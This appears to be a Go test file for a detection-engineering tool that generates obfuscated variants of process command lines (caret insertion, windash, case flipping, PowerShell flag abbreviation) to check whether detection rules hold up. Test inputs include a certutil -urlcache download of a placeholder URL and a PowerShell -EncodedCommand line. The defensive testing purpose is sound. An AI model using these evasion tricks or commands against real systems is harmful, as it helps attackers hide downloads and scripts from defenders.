package mutate

import (
	"strings"
	"testing"

	"github.com/principlebreach/ordeal/internal/engine"
)

func TestClassify(t *testing.T) {
	cases := map[string]FieldClass{
		"CommandLine":       ClassCommand,
		"ParentCommandLine": ClassCommand,
		"ScriptBlockText":   ClassCommand,
		"Image":             ClassPath,
		"ParentImage":       ClassPath,
		"TargetFilename":    ClassPath,
		"User":              ClassGeneric,
		"EventID":           ClassGeneric,
	}
	for field, want := range cases {
		if got := Classify(field); got != want {
			t.Errorf("Classify(%q) = %v, want %v", field, got, want)
		}
	}
}

func TestFlagAbbreviation(t *testing.T) {
	got := flagAbbreviation{}.Apply("powershell.exe -NoProfile -EncodedCommand SQBFAFgA")
	var sawEnc, sawNop bool
	for _, r := range got {
		if strings.Contains(r.Value, "-enc ") {
			sawEnc = true
		}
		if strings.Contains(strings.ToLower(r.Value), "-nop ") {
			sawNop = true
		}
	}
	if !sawEnc || !sawNop {
		t.Fatalf("expected -enc and -nop abbreviations, got %+v", got)
	}
}

func TestWindashProducesThreeVariants(t *testing.T) {
	got := windashSubstitution{}.Apply("cmd.exe -flag value")
	if len(got) != 3 {
		t.Fatalf("expected 3 windash variants, got %d", len(got))
	}
	if !strings.Contains(got[0].Value, "/flag") {
		t.Errorf("expected forward-slash variant, got %q", got[0].Value)
	}
}

func TestCaretOnlyTouchesCommandToken(t *testing.T) {
	// The base64 payload must survive untouched; only the command word changes.
	got := caretInsertion{}.Apply("certutil.exe -urlcache http://x/y")
	if len(got) != 1 {
		t.Fatalf("expected one caret variant, got %d", len(got))
	}
	if !strings.Contains(got[0].Value, "^") {
		t.Errorf("expected a caret in the command token, got %q", got[0].Value)
	}
	if !strings.Contains(got[0].Value, "-urlcache http://x/y") {
		t.Errorf("caret leaked past the command token: %q", got[0].Value)
	}
}

func TestTokenMutatorsSkipOpaquePayload(t *testing.T) {
	// A lone base64 blob as the command token must not be reshaped, because that
	// would change what executes.
	payload := "SQBFAFgAKAB0AGUAcwB0ACkA"
	for _, m := range []Mutator{caretInsertion{}, quoteInsertion{}, powershellTick{}} {
		if got := m.Apply(payload); len(got) != 0 {
			t.Errorf("%s reshaped an opaque payload: %+v", m.Name(), got)
		}
	}
}

func TestCaseFlipPreservesPayload(t *testing.T) {
	got := caseFlip{}.Apply("powershell.exe -enc SQBFAFgAKAB0AGUAcwB0ACkA")
	if len(got) != 1 {
		t.Fatalf("expected one case-flip variant, got %d", len(got))
	}
	// The payload token must be byte-identical after the flip.
	if !strings.Contains(got[0].Value, "SQBFAFgAKAB0AGUAcwB0ACkA") {
		t.Errorf("case-flip corrupted the base64 payload: %q", got[0].Value)
	}
	if !strings.Contains(got[0].Value, "POWERSHELL.EXE") {
		t.Errorf("case-flip did not flip the command token: %q", got[0].Value)
	}
}

func TestGenerateOnlyMutatesCommandFields(t *testing.T) {
	base := engine.Event{
		"Image":       `C:\Windows\System32\certutil.exe`, // path class: must be untouched
		"CommandLine": "certutil.exe -urlcache http://x/y",
		"EventID":     4688, // non-string
	}
	variants := Generate(base, StringFields(base))
	if len(variants) == 0 {
		t.Fatal("expected variants from CommandLine")
	}
	for _, v := range variants {
		if v.Field != "CommandLine" {
			t.Errorf("mutation touched non-command field %q", v.Field)
		}
		if v.After == v.Before {
			t.Errorf("no-op mutation leaked through: %s", v.Mutator)
		}
	}
}

func TestGenerateDoesNotMutateInput(t *testing.T) {
	base := engine.Event{"CommandLine": "certutil.exe -urlcache http://x/y"}
	_ = Generate(base, StringFields(base))
	if base["CommandLine"] != "certutil.exe -urlcache http://x/y" {
		t.Fatalf("input event was mutated: %v", base["CommandLine"])
	}
}

func TestSelectOnlyAndSkip(t *testing.T) {
	only := Select(Options{Only: []string{"windash", "flag-abbreviation"}})
	if len(only) != 2 {
		t.Fatalf("expected 2 mutators, got %d", len(only))
	}
	full := len(Catalog())
	skipped := Select(Options{Skip: []string{"windash"}})
	if len(skipped) != full-1 {
		t.Fatalf("expected %d mutators after skip, got %d", full-1, len(skipped))
	}
	for _, m := range skipped {
		if m.Name() == "windash" {
			t.Fatal("skip did not exclude windash")
		}
	}
}

func TestEveryMutatorHasMetadata(t *testing.T) {
	seen := map[string]bool{}
	for _, m := range Catalog() {
		if m.Name() == "" || m.Technique() == "" || m.Describe() == "" {
			t.Errorf("mutator %T missing metadata", m)
		}
		if seen[m.Name()] {
			t.Errorf("duplicate mutator name %q", m.Name())
		}
		seen[m.Name()] = true
	}
}

func TestApplyIsDeterministic(t *testing.T) {
	in := "powershell.exe -NoProfile -Command -EncodedCommand AAAA"
	first := flagAbbreviation{}.Apply(in)
	for i := 0; i < 10; i++ {
		again := flagAbbreviation{}.Apply(in)
		if len(again) != len(first) {
			t.Fatal("flag-abbreviation output length varies between runs")
		}
		for j := range again {
			if again[j] != first[j] {
				t.Fatalf("flag-abbreviation output order varies: %v vs %v", first, again)
			}
		}
	}
}
